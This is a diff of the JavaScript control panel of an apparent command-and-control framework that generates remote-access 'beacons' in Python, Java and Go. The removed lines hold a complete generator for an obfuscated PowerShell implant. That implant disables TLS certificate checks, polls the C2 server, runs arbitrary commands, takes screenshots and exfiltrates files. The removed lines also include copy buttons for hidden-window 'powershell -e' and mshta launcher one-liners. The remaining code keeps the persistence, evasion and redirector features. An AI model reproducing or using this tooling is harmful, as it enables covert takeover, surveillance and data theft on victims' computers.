@@ -179,7 +179,7 @@ const LANG = {
     feat_screenshot_sched:'Screenshot schedule', feat_screenshot_sched_desc:'screenshot <N> — auto-capture every N min (0 to stop)',
     gen_output_name:'Output filename', gen_output_name_ph:'beacon (no extension)',
     gen_btn:'⚡ Generate Beacon', save_as:'Save as',
-    info_title:'Info', info_type_py:'Python 3 beacon', info_type_java:'Java 11 beacon', info_type_ps:'PowerShell 5.1+ beacon',
+    info_title:'Info', info_type_py:'Python 3 beacon', info_type_java:'Java 11 beacon',
     info_out_py:'.py / Linux ELF', info_cross_yes:'Yes — Windows/Linux/macOS',
     rd_title:'Parameters',
     rd_desc:'Generate config for a redirector server (clean VPS) that forwards C2 traffic to the real server and serves legitimate content to others.',
@@ -274,7 +274,7 @@ const LANG = {
     feat_screenshot_sched:'Screenshot automático', feat_screenshot_sched_desc:'screenshot <N> — captura cada N minutos (0 para detener)',
     gen_output_name:'Nombre del archivo', gen_output_name_ph:'beacon (sin extensión)',
     gen_btn:'⚡ Generar Beacon', save_as:'Guardar como',
-    info_title:'Info', info_type_py:'Python 3 beacon', info_type_java:'Java 11 beacon', info_type_ps:'Beacon PowerShell 5.1+',
+    info_title:'Info', info_type_py:'Python 3 beacon', info_type_java:'Java 11 beacon',
     info_out_py:'.py / Linux ELF', info_cross_yes:'Sí — Windows/Linux/macOS',
     rd_title:'Parámetros',
     rd_desc:'Genera configuración para un servidor redirector (VPS limpio) que reenvía tráfico C2 al servidor real y sirve contenido legítimo al resto.',
@@ -2232,7 +2232,6 @@ function renderGenerateView() {
         <button id="lang-py-btn"   onclick="setBeaconLang('py')"   style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--accent);color:#fff;border:none;cursor:pointer">Python</button>
         <button id="lang-java-btn" onclick="setBeaconLang('java')" style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Java</button>
         <button id="lang-go-btn"   onclick="setBeaconLang('go')"   style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Go</button>
-        <button id="lang-ps-btn"   onclick="setBeaconLang('ps')"   style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">PowerShell</button>
       </div>
     </div>
 
@@ -2384,17 +2383,6 @@ function renderGenerateView() {
             <span style="color:var(--text3)">Cross-compile</span><span style="color:var(--online)">${t('info_cross_yes')}</span>
           </div>
         </div>
-        <div id="beacon-info-ps" style="display:none">
-          <div style="display:grid;grid-template-columns:auto 1fr;gap:5px 14px;font-size:11px">
-            <span style="color:var(--text3)">Type</span><span style="color:var(--text2)">${t('info_type_ps')}</span>
-            <span style="color:var(--text3)">Protocol</span><span style="color:var(--text2)">HTTPS polling</span>
-            <span style="color:var(--text3)">Auth</span><span style="color:var(--text2)">X-Agent-Secret header (XOR)</span>
-            <span style="color:var(--text3)">TLS</span><span style="color:var(--text2)">Self-signed accepted</span>
-            <span style="color:var(--text3)">Deps</span><span style="color:var(--text2)">None (Windows built-in)</span>
-            <span style="color:var(--text3)">Output</span><span style="color:var(--text2)">.ps1 + base64 one-liners</span>
-            <span style="color:var(--text3)">Obfuscation</span><span style="color:var(--online)">XOR strings, junk code, random names</span>
-          </div>
-        </div>
       </div>
 
       <!-- Code output — fills remaining right-column height -->
@@ -2422,12 +2410,6 @@ function renderGenerateView() {
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-linux')">⬇ Linux ELF</button>
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-windows')">⬇ Windows EXE</button>
               <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-go">⎘ Copy</button>
-            </div>
-            <div style="display:flex;gap:6px;flex-wrap:wrap;display:none" id="beacon-dl-buttons-ps">
-              <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('ps')">⬇ .ps1</button>
-              <button class="btn btn-sm btn-ghost" onclick="copyPSOneliner('iex')" title="Copy powershell -e one-liner">⎘ IEX one-liner</button>
-              <button class="btn btn-sm btn-ghost" onclick="copyPSOneliner('mshta')" title="Copy mshta one-liner">⎘ mshta one-liner</button>
-              <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-ps">⎘ Copy .ps1</button>
             </div>
           </div>
           <div style="flex:1;display:flex;flex-direction:column;min-height:0;background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden">
@@ -3070,7 +3052,7 @@ let _beaconLang = 'py';
 
 function setBeaconLang(lang) {
   _beaconLang = lang;
-  ['py','java','go','ps'].forEach(l => {
+  ['py','java','go'].forEach(l => {
     const btn = document.getElementById('lang-'+l+'-btn');
     if (!btn) return;
     btn.style.background = lang === l ? 'var(--accent)' : 'var(--bg3)';
@@ -3079,12 +3061,11 @@ function setBeaconLang(lang) {
   document.getElementById('beacon-info-py').style.display   = lang === 'py'   ? '' : 'none';
   document.getElementById('beacon-info-java').style.display = lang === 'java' ? '' : 'none';
   document.getElementById('beacon-info-go').style.display   = lang === 'go'   ? '' : 'none';
-  document.getElementById('beacon-info-ps').style.display   = lang === 'ps'   ? '' : 'none';
-  // screenshot_sched only works on Python — disable+uncheck for Java/Go/PS
+  // screenshot_sched only works on Python — disable+uncheck for Java/Go
   const _schedCb = document.getElementById('feat-screenshot-sched');
   const _schedLbl = _schedCb ? _schedCb.closest('label') : null;
   if (_schedCb) {
-    const _pyOnly = lang !== 'py';
+      const _pyOnly = lang !== 'py';
     _schedCb.disabled = _pyOnly;
     if (_pyOnly) _schedCb.checked = false;
     if (_schedLbl) _schedLbl.style.opacity = _pyOnly ? '0.4' : '';
@@ -3152,7 +3133,6 @@ async function generateBeacon() {
   document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
   document.getElementById('beacon-dl-buttons-java').style.display = 'none';
   document.getElementById('beacon-dl-buttons-go').style.display   = 'none';
-  document.getElementById('beacon-dl-buttons-ps').style.display   = 'none';
   if (_beaconLang === 'java') {
     code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
     filename = `${_getBeaconName()}.java`;
@@ -3161,10 +3141,6 @@ async function generateBeacon() {
     code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
     filename = `${_getBeaconName()}.go`;
     document.getElementById('beacon-dl-buttons-go').style.display = 'flex';
-  } else if (_beaconLang === 'ps') {
-    code = generatePSBeaconCode(urls, sleep, jitter, info.agent_secret, features);
-    filename = `${_getBeaconName()}.ps1`;
-    document.getElementById('beacon-dl-buttons-ps').style.display = 'flex';
   } else {
     code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
     filename = `${_getBeaconName()}.py`;
@@ -5124,369 +5100,6 @@ func main() {${fetchKeyCall}${sandboxCall}${bgCall}${killDateCall}${persistCall}
 `;
 }
 
-// ── PowerShell beacon generator ───────────────────────────────────────────────
-function generatePSBeaconCode(urls, sleep, jitter, secret, features) {
-  // Random identifier helper
-  const _alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-  const _alphanum = _alpha + '0123456789';
-  function rv(minLen, maxLen) {
-    minLen = minLen || 6; maxLen = maxLen || 14;
-    const len = minLen + Math.floor(Math.random() * (maxLen - minLen + 1));
-    let s = _alpha[Math.floor(Math.random() * _alpha.length)];
-    for (let i = 1; i < len; i++) s += _alphanum[Math.floor(Math.random() * _alphanum.length)];
-    return s;
-  }
-
-  // XOR encrypt a string with a key, returns hex string
-  function xorHex(str, key) {
-    const kb = [];
-    for (let i = 0; i < key.length; i++) kb.push(key.charCodeAt(i));
-    let hex = '';
-    for (let i = 0; i < str.length; i++) {
-      hex += (str.charCodeAt(i) ^ kb[i % kb.length]).toString(16).padStart(2, '0');
-    }
-    return hex;
-  }
-
-  // Generate a random 8-byte XOR key (printable ASCII 33-126)
-  function randKey(len) {
-    len = len || 8;
-    let k = '';
-    for (let i = 0; i < len; i++) k += String.fromCharCode(33 + Math.floor(Math.random() * 94));
-    return k;
-  }
-
-  // Generate a random private IP
-  function randPrivateIP() {
-    const r = Math.floor(Math.random() * 3);
-    if (r === 0) return `10.${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*254)+1}`;
-    if (r === 1) return `172.${Math.floor(Math.random()*16)+16}.${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*254)+1}`;
-    return `192.168.${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*254)+1}`;
-  }
-
-  // Key and variable names
-  const masterKey = randKey(12);
-  const vSt       = rv();   // state hashtable
-  const vUrls     = rv();   // urls array
-  const vKey      = rv();   // master key
-  const vKB       = rv();   // key bytes array
-  const vSecret   = rv();   // secret string
-  const vSecHex   = rv();   // secret hex variable
-  const vIdx      = rv();   // url index
-  const vResp     = rv();   // response variable
-  const vBody     = rv();   // body variable
-  const vCmd      = rv();   // command variable
-  const vTaskId   = rv();   // task_id variable
-  const vOut      = rv();   // output variable
-  const vI        = rv(1,2);// loop index
-  const vJ        = rv(1,2);
-  const vBytes    = rv();
-  const vStr      = rv();
-  const vTmp      = rv();
-  const vJi       = rv();   // jitter
-  const vMac      = rv();
-  const vFp       = rv();
-  const vSha      = rv();
-  const vCwd      = rv();
-  const vData     = rv();
-  const vMethod   = rv();
-
-  // Function names
-  const fnXorDec  = rv();
-  const fnPost    = rv();
-  const fnGet     = rv();
-  const fnCheckin = rv();
-  const fnResult  = rv();
-  const fnExec    = rv();
-  const fnFindF   = features.find ? rv() : '';
-  // Junk function names (legit-sounding)
-  const junkFns = [
-    ['Get-SystemMetrics',   rv()],
-    ['Invoke-HealthCheck',  rv()],
-    ['Test-NetworkPath',    rv()],
-    ['Get-ServiceStatus',   rv()],
-    ['Sync-PolicyUpdate',   rv()],
-    ['Register-Heartbeat',  rv()],
-    ['Update-TelemetryData',rv()],
-    ['Get-EnvironmentInfo', rv()],
-    ['Invoke-Diagnostics',  rv()],
-    ['Clear-TempBuffers',   rv()],
-  ];
-
-  // Encrypt sensitive strings
-  const secretHex  = xorHex(secret, masterKey);
-  const encUrls    = urls.map(u => xorHex(u, masterKey));
-  const checkinHex = xorHex('/api/beacon/checkin', masterKey);
-  const resultHex  = xorHex('/api/beacon/result', masterKey);
-  const keyHex     = Array.from(masterKey).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
-
-  // Fake junk variables
-  const junkVars = [];
-  for (let i = 0; i < 6; i++) {
-    const n = rv();
-    const vals = [
-      `$${n} = [System.Guid]::NewGuid().ToString()`,
-      `$${n} = (Get-Date).Ticks % ${1000 + Math.floor(Math.random()*9000)}`,
-      `$${n} = [System.Environment]::MachineName.Length`,
-      `$${n} = [System.Math]::Round([System.Math]::PI * ${(Math.random()*10+1).toFixed(4)}, 6)`,
-      `$${n} = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory().Length`,
-      `$${n} = [System.Text.Encoding]::UTF8.GetByteCount("${rv(8,20)}")`,
-    ];
-    junkVars.push(vals[Math.floor(Math.random() * vals.length)]);
-  }
-
-  // Fake HTTP junk calls to random private IPs
-  const fakeIPs = [randPrivateIP(), randPrivateIP(), randPrivateIP()];
-  const fakePaths = ['/health', '/api/status', '/v1/ping', '/metrics', '/check'];
-  const junkHttpFnName = rv();
-  const vJunkWc = rv();
-  const vJunkUri = rv();
-
-  // Build junk functions block
-  let junkFnsBlock = '';
-  for (const [friendly, internal] of junkFns) {
-    const p1 = rv(), p2 = rv();
-    junkFnsBlock += `function ${internal} {
-    param($${p1} = $null, $${p2} = $null)
-    return $null
-}
-`;
-  }
-
-  // Junk HTTP function
-  junkFnsBlock += `function ${junkHttpFnName} {
-    param($${vJunkUri})
-    try {
-        $${vJunkWc} = New-Object System.Net.WebClient
-        $${vJunkWc}.DownloadString($${vJunkUri}) | Out-Null
-    } catch {}
-}
-`;
-
-  // Build URL array literal
-  const urlArrayLit = encUrls.map(h => `'${h}'`).join(',');
-  const junkCallsBlock = fakeIPs.map((ip, idx) => {
-    const path = fakePaths[idx % fakePaths.length];
-    const scheme = Math.random() > 0.5 ? 'http' : 'https';
-    return `${junkHttpFnName} "http://${ip}${path}"`;
-  }).join('\n');
-
-  // junk var block
-  const junkVarBlock = junkVars.join('\n');
-
-  // junk function call block (sprinkled)
-  const junkCallsFns = junkFns.slice(0, 4).map(([,n]) => `${n}`).join('\n');
-
-  // find block
-  const findBlock = features.find ? `
-        'find' {
-            $${vTmp} = $${vCmd} -split ' ',3
-            $searchPath = if ($${vTmp}.Count -ge 3) { $${vTmp}[1] } else { $${vSt}.cwd }
-            $pattern    = if ($${vTmp}.Count -ge 3) { $${vTmp}[2] } else { if ($${vTmp}.Count -ge 2) { $${vTmp}[1] } else { '*' } }
-            $found = @()
-            try {
-                Get-ChildItem -Path $searchPath -Recurse -ErrorAction SilentlyContinue |
-                Where-Object { $_.Name -like $pattern } |
-                ForEach-Object { $found += $_.FullName }
-            } catch {}
-            $${vOut} = if ($found.Count -gt 0) { $found -join "\`n" } else { "[find] no results" }
-        }` : '';
-
-  const code = `Add-Type -TypeDefinition @"
-using System.Net;
-using System.Net.Security;
-using System.Security.Cryptography.X509Certificates;
-public class ${rv()} {
-    public static void Bypass() {
-        ServicePointManager.ServerCertificateValidationCallback =
-            delegate(object s, X509Certificate c, X509Chain ch, SslPolicyErrors e) { return true; };
-        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-    }
-}
-"@
-[${rv()}]::Bypass()
-
-${junkVarBlock}
-
-function ${fnXorDec} {
-    param($${vStr}, $${vKB})
-    $${vBytes} = for ($${vI} = 0; $${vI} -lt $${vStr}.Length; $${vI} += 2) {
-        [byte]([Convert]::ToInt32($${vStr}.Substring($${vI}, 2), 16) -bxor $${vKB}[$${vI}/2 % $${vKB}.Length])
-    }
-    return [System.Text.Encoding]::UTF8.GetString([byte[]]$${vBytes})
-}
-
-${junkFnsBlock}
-
-$${vKey} = [byte[]]('${keyHex}'.ToCharArray() | ForEach-Object { $_ } |
-    Select-Object -Index (0,2,4,6,8,10,12,14,16,18,20,22) |
-    ForEach-Object {
-        $${vTmp} = @(); $null
-    }) -ne $null
-$${vKey} = for ($${vI} = 0; $${vI} -lt '${keyHex}'.Length; $${vI} += 2) {
-    [byte][Convert]::ToInt32('${keyHex}'.Substring($${vI}, 2), 16)
-}
-
-$${vUrls}   = @(${urlArrayLit})
-$${vSecret} = ${fnXorDec} '${secretHex}' $${vKey}
-
-$${vSt} = @{
-    sl  = ${sleep}
-    jt  = ${jitter}
-    cwd = $env:USERPROFILE
-    aid = ''
-}
-
-function ${fnPost} {
-    param($${vMethod}, $${vBody})
-    $ep = ${fnXorDec} $${vUrls}[$${vIdx} % $${vUrls}.Count] $${vKey}
-    $ep = $ep.TrimEnd('/') + (${fnXorDec} $${vMethod} $${vKey})
-    try {
-        $${vResp} = Invoke-RestMethod -Uri $ep -Method POST -Body ($${vBody} | ConvertTo-Json -Compress) -ContentType 'application/json' -Headers @{'X-Agent-Secret'=$${vSecret}} -UseBasicParsing
-        return $${vResp}
-    } catch { return $null }
-}
-
-function ${fnGet} {
-    param($${vMethod})
-    $ep = ${fnXorDec} $${vUrls}[$${vIdx} % $${vUrls}.Count] $${vKey}
-    $ep = $ep.TrimEnd('/') + (${fnXorDec} $${vMethod} $${vKey})
-    try {
-        return Invoke-RestMethod -Uri $ep -Method GET -Headers @{'X-Agent-Secret'=$${vSecret}} -UseBasicParsing
-    } catch { return $null }
-}
-
-function ${fnExec} {
-    param($${vCmd}, $${vTaskId})
-    $${vOut} = ''
-    $${vCwd} = $${vSt}.cwd
-    $cmdLo = $${vCmd}.Trim().ToLower()
-    switch -Regex ($cmdLo) {
-        '^info$' {
-            $${vOut} = "hostname: $env:COMPUTERNAME\`nuser: $env:USERNAME\`nos: " + [System.Environment]::OSVersion.VersionString + "\`ncwd: $${vCwd}\`npid: $PID"
-        }
-        '^screenshot$' {
-            try {
-                Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-                $s  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bmp = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
-                $g   = [System.Drawing.Graphics]::FromImage($bmp)
-                $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
-                $ms  = New-Object System.IO.MemoryStream
-                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
-                $b64 = [Convert]::ToBase64String($ms.ToArray())
-                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
-                $${vOut} = "data:image/png;base64,$b64"
-            } catch { $${vOut} = "[screenshot] error: $_" }
-        }
-        '^ps$' {
-            $${vOut} = Get-Process | Select-Object Id,ProcessName,CPU | Format-Table -AutoSize | Out-String
-        }
-        '^kill (\d+)$' {
-            $pid2 = [int]($${vCmd} -split ' ')[1]
-            try { Stop-Process -Id $pid2 -Force; $${vOut} = "Killed $pid2" } catch { $${vOut} = "Error: $_" }
-        }
-        '^sleep (\d+)$' {
-            $${vSt}.sl = [int]($${vCmd} -split ' ')[1]
-            $${vOut} = "Sleep set to $($${vSt}.sl)s"
-        }
-        '^cd (.+)$' {
-            $newPath = $${vCmd}.Substring(3).Trim()
-            if (Test-Path $newPath -PathType Container) {
-                $${vSt}.cwd = (Resolve-Path $newPath).Path
-                $${vOut} = "cwd: $($${vSt}.cwd)"
-            } else { $${vOut} = "[cd] path not found: $newPath" }
-        }
-        '^download (.+)$' {
-            $fp = $${vCmd}.Substring(9).Trim()
-            try {
-                $bytes = [System.IO.File]::ReadAllBytes($fp)
-                $${vOut} = "data:application/octet-stream;base64," + [Convert]::ToBase64String($bytes)
-            } catch { $${vOut} = "[download] error: $_" }
-        }${findBlock}
-        default {
-            try {
-                $${vOut} = &([scriptblock]::Create($${vCmd})) 2>&1 | Out-String
-                if ([string]::IsNullOrEmpty($${vOut})) { $${vOut} = "[done]" }
-            } catch { $${vOut} = "[error] $_" }
-        }
-    }
-    return $${vOut}
-}
-
-# Startup junk noise
-${junkCallsBlock}
-${junkCallsFns}
-
-$script:${vIdx} = 0
-$${vMac}  = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MacAddress } | Select-Object -First 1 -ExpandProperty MacAddress) -replace ':',''
-$${vFp}   = [System.Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME$${vMac}")
-$${vSha}  = [System.Security.Cryptography.SHA256]::Create()
-$fpHash   = ([System.BitConverter]::ToString($${vSha}.ComputeHash($${vFp})) -replace '-','').ToLower()
-
-if ($${vSt}.aid -eq '') {
-    $${vSt}.aid = [System.Guid]::NewGuid().ToString()
-}
-
-while ($true) {
-    try {
-        $${vData} = ${fnPost} '${checkinHex}' @{
-            agent_id      = $${vSt}.aid
-            hostname      = $env:COMPUTERNAME
-            ip_internal   = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
-            os_info       = [System.Environment]::OSVersion.VersionString
-            username      = $env:USERNAME
-            pid           = $PID
-            sleep_interval= $${vSt}.sl
-            cwd           = $${vSt}.cwd
-            beacon_lang   = 'powershell'
-        }
-        if ($${vData} -and $${vData}.task_id) {
-            $${vTaskId} = $${vData}.task_id
-            $${vCmd}    = $${vData}.command
-            $${vOut}    = ${fnExec} $${vCmd} $${vTaskId}
-            ${fnPost} '${resultHex}' @{ task_id=$${vTaskId}; output=$${vOut}; status='done' } | Out-Null
-        }
-    } catch {}
-    $${vJi} = $${vSt}.sl * ($${vSt}.jt / 100.0) * (Get-Random -Minimum 0.0 -Maximum 1.0)
-    Start-Sleep -Seconds ([int]($${vSt}.sl + $${vJi}))
-    $script:${vIdx}++
-}`;
-  return code;
-}
-
-function copyBeacon() {
-  const code = document.getElementById('beacon-code').textContent;
-  navigator.clipboard.writeText(code).then(() => {
-    const btn = document.getElementById('copy-btn');
-    btn.textContent = '✓ Copied!';
-    setTimeout(() => btn.textContent = '⎘ Copy', 2000);
-  });
-}
-
-function copyPSOneliner(mode) {
-  const ps1 = document.getElementById('beacon-code').textContent;
-  if (!ps1) return;
-  // Encode as UTF-16LE base64
-  const buf = new Uint16Array(ps1.length);
-  for (let i = 0; i < ps1.length; i++) buf[i] = ps1.charCodeAt(i);
-  const b64 = btoa(String.fromCharCode(...new Uint8Array(buf.buffer)));
-  let oneliner;
-  if (mode === 'mshta') {
-    oneliner = `mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -nop -w hidden -NonInteractive -e ${b64}',0,1);close()"`;
-  } else {
-    oneliner = `powershell -nop -w hidden -NonInteractive -e ${b64}`;
-  }
-  navigator.clipboard.writeText(oneliner).then(() => {
-    const id = mode === 'mshta' ? null : null;
-    // Brief toast via compile-status
-    const statusEl = document.getElementById('compile-status');
-    statusEl.style.cssText = 'display:block;background:var(--bg3);color:var(--online);padding:8px 14px;border-radius:6px;font-size:12px';
-    statusEl.textContent = `✓ ${mode === 'mshta' ? 'mshta' : 'IEX'} one-liner copied to clipboard`;
-    setTimeout(() => { statusEl.style.display = 'none'; }, 2500);
-  });
-}
-
 function showWindowsInstructions() {
   const statusEl = document.getElementById('compile-status');
   statusEl.style.display = 'block';
@@ -5519,12 +5132,6 @@ async function downloadBeacon(type) {
 
   const name = _getBeaconName();
   const statusEl = document.getElementById('compile-status');
-
-  if (type === 'ps') {
-    const blob = new Blob([code], { type: 'text/plain' });
-    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${name}.ps1`; a.click();
-    return;
-  }
 
   if (type === 'py') {
     const blob = new Blob([code], { type: 'text/plain' });
@@ -5639,14 +5246,13 @@ async function openPtyShell(agentId) {
   _ptyIsWin = (agentInfo.os_info || '').toLowerCase().includes('windows');
   const _beaconLang = (agentInfo.beacon_lang || '').toLowerCase();
 
-  // Java, Go and PowerShell beacons don't support PTY
-  if (_beaconLang === 'java' || _beaconLang === 'go' || _beaconLang === 'powershell') {
-    const _langLabel = _beaconLang === 'powershell' ? 'PowerShell' : _beaconLang.toUpperCase();
-    document.getElementById('pty-status').textContent = `✗ PTY not supported for ${_langLabel} beacons`;
+  // Java and Go beacons don't support PTY
+  if (_beaconLang === 'java' || _beaconLang === 'go') {
+    document.getElementById('pty-status').textContent = `✗ PTY not supported for ${_beaconLang.toUpperCase()} beacons`;
     document.getElementById('pty-status').style.color = 'var(--danger)';
     document.getElementById('pty-terminal').innerHTML =
       `<div style="padding:24px;color:var(--text3);font-family:var(--font-mono);font-size:13px">` +
-      `<p style="color:var(--danger);font-size:15px">⚠ PTY not supported for ${_langLabel} beacons</p>` +
+      `<p style="color:var(--danger);font-size:15px">⚠ PTY not supported for ${_beaconLang.toUpperCase()} beacons</p>` +
       `<p>Interactive shell (PTY) is only available for <strong>Python</strong> beacons.</p>` +
       `<p>To run commands on this agent, use the command panel below.</p></div>`;
     return;
